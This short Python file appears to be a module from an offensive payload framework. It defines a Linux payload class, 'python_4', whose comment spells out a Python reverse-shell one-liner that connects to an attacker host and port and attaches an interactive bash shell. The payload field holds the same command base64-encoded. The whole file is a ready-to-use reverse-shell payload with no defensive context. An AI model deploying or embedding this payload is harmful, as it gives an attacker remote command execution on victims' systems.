from lib.framework.core.payload import Payload


# python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
class python_4(Payload):
    name = "python_4"
    platform = ["linux"]
    payload = "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie0xIT1NUfSIse0xQT1JUfSkpO3N1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0sc3RkaW49cy5maWxlbm8oKSxzdGRvdXQ9cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSkn"
